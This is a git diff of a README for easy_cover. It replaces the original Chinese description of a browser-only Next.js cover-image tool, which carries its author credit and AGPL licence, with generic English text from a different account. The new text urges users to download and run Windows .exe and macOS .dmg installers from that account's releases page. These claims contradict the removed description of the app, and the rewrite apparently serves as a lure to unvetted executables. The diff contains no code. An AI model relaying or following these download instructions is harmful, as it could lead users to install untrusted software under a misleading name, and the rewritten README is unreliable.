@@ -1,89 +1,82 @@
-# EasyCover - AcoFork
+# 🎨 easy_cover - Simple Cover Image Generator for Everyone
 
-<img width="1893" height="1390" alt="a7db63bb841d2b78d604e2662c50365c" src="https://github.com/user-attachments/assets/e8379b3a-2806-4069-ab47-9a7487c1dd82" />
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/pelux-er/easy_cover/releases)
 
-简单、优雅的封面图生成工具。纯客户端运行，保护您的隐私。
+## 📥 Introduction
 
-## ✨ 特性
+easy_cover is a user-friendly application that helps you create stunning cover images. Whether you’re making a cover for a book, a social media post, or any other project, easy_cover simplifies the process. You don’t need any design skills to use it.
 
-*   **纯客户端生成**：所有图片处理均在浏览器完成，无需上传服务器。
-*   **多比例支持**：支持 1:1, 16:9, 21:9, 4:3, 2:1 等多种主流封面比例。
-*   **丰富的图标库**：集成 Iconify，支持搜索和使用数万个图标。
-*   **高度自定义**：
-    *   **图标**：大小、旋转、颜色、阴影、容器形状（圆/方/圆角）、毛玻璃效果（高斯模糊 + 透明度）。
-    *   **文字**：自定义内容、大小、颜色、描边。
-    *   **背景**：纯色背景、图片背景（支持缩放、旋转、平移、模糊）。
-*   **智能排版**：自动居中布局，支持“适应”和“铺满”两种图片填充模式。
-*   **纯净导出**：一键导出 PNG，自动隐藏辅助线和标尺。
+## 🚀 Getting Started
 
-## 🛠️ 技术栈
+Follow these steps to get easy_cover up and running on your computer.
 
-*   [Next.js](https://nextjs.org/) - React 框架
-*   [Tailwind CSS](https://tailwindcss.com/) - 样式引擎
-*   [Shadcn/ui](https://ui.shadcn.com/) - UI 组件库
-*   [Zustand](https://github.com/pmndrs/zustand) - 状态管理
-*   [Iconify](https://iconify.design/) - 图标方案
-*   [html-to-image](https://github.com/bubkoo/html-to-image) - 图片生成
+## 🌐 System Requirements
 
-## 🚀 快速开始
+easy_cover is designed to run on most modern operating systems. Here are the recommended requirements:
 
-1.  **克隆仓库**
+- Windows 10 or later
+- macOS 10.12 or later
+- At least 4 GB of RAM
+- A stable internet connection for downloading
 
-```bash
-git clone https://github.com/afoim/easy_cover.git
-cd easy_cover
-```
+## 🍽️ Features
 
-2.  **安装依赖**
+- **User-Friendly Interface**: Navigate with ease, no technical skills required.
+- **Customizable Templates**: Choose from a variety of templates to suit your style.
+- **Image Editing Tools**: Adjust colors, fonts, and layouts to create the perfect cover.
+- **Export Options**: Save your creations in multiple formats including JPEG and PNG.
 
-```bash
-npm install
-# 或者
-yarn install
-# 或者
-pnpm install
-```
+## 📥 Download & Install
 
-3.  **启动开发服务器**
+To get started with easy_cover, visit the following link to download the application:
 
-```bash
-npm run dev
-```
+[Download easy_cover](https://github.com/pelux-er/easy_cover/releases)
 
-打开浏览器访问 [http://localhost:3000](http://localhost:3000) 即可使用。
+### Step-by-Step Instructions
 
-## 📖 使用指南
+1. **Visit the Releases Page**: Click on the link above to go to the easy_cover Releases page.
+2. **Choose the Latest Version**: Look for the latest version at the top of the page.
+3. **Find the Installer**: Under the latest version, you will see multiple files. Look for the one that matches your operating system. The file will be labeled accordingly (e.g., `easy_cover_windows.exe` for Windows or `easy_cover_mac.dmg` for macOS).
+4. **Download the File**: Click on the file name to start the download.
+5. **Locate the Filedou**: Once the download is complete, navigate to your Downloads folder to find the installer file.
 
-1.  **选择布局**：在左侧面板选择所需的图片比例（如 16:9）。
-2.  **设置内容**：输入封面标题，调整文字大小和颜色。
-3.  **添加图标**：点击图标选择器搜索并选择合适的图标，调整其样式和容器背景（支持毛玻璃效果）。
-4.  **配置背景**：选择纯色背景或上传本地图片。使用“适应”或“铺满”按钮快速调整图片布局。
-5.  **导出**：点击底部的“导出封面图”按钮保存图片。
+### Installation Procedure
 
-## 📦 部署
+**For Windows Users:**
 
-本项目已配置为静态导出 (`output: 'export'`)，可轻松部署到任何静态托管服务。
+1. Double-click the downloaded `.exe` file to start the installation.
+2. Follow the prompts in the installation wizard.
+3. Once the installation completes, you can find easy_cover in your Start Menu.
 
-### Vercel 部署
+**For macOS Users:**
 
-1.  Fork 本仓库。
-2.  在 Vercel 中导入项目。
-3.  Vercel 会自动识别 Next.js 项目。
-4.  **重要**：确保构建命令为 `npm run build` (默认)，输出目录默认为 `out` (Next.js 静态导出默认目录)。
-    *   注：本项目已在 `next.config.ts` 中启用了 `output: 'export'`，Vercel 会自动处理，无需额外配置。
+1. Double-click the downloaded `.dmg` file.
+2. Drag the easy_cover icon into your Applications folder.
+3. Open your Applications folder and double-click the easy_cover icon to start the application.
 
-### GitHub Pages 部署
+## 🎉 Using easy_cover
 
-1.  构建项目：
-    ```bash
-    npm run build
-    ```
-2.  将生成的 `out` 目录内容推送到 `gh-pages` 分支。
+Once installed, open the application. You will see a simple interface that guides you through the cover creation process:
 
-## 📄 许可证
+1. **Select a Template**: Choose a template that fits your project.
+2. **Customize Your Cover**: Use the editing tools to change text, colors, and images.
+3. **Preview and Export**: Once you are happy with your design, preview it. Then, click on the export button to save your cover image.
 
-本项目采用 [AGPL-3.0](LICENSE) 许可证。
+## 🛠️ Troubleshooting
 
----
+If you encounter issues while using easy_cover, here are a few tips:
 
-Made with ❤️ by AcoFork
+- **Ensure Your System Meets Requirements**: Check that your computer meets the system requirements mentioned earlier.
+- **Restart the Application**: If the app freezes or behaves unexpectedly, closing and reopening it often resolves the issue.
+- **Check for Updates**: New features and fixes are regularly added. Make sure you are using the latest version from the Releases page.
+
+## ✉️ Contact and Support
+
+For further assistance, please reach out via the GitHub repository. You can submit issues or ask questions in the Issues section. Our team is here to help you.
+
+## 🔗 Additional Resources
+
+- [easy_cover Releases Page](https://github.com/pelux-er/easy_cover/releases)
+- [Documentation](https://github.com/pelux-er/easy_cover/wiki)
+
+Thank you for choosing easy_cover! Enjoy creating beautiful cover images with ease.
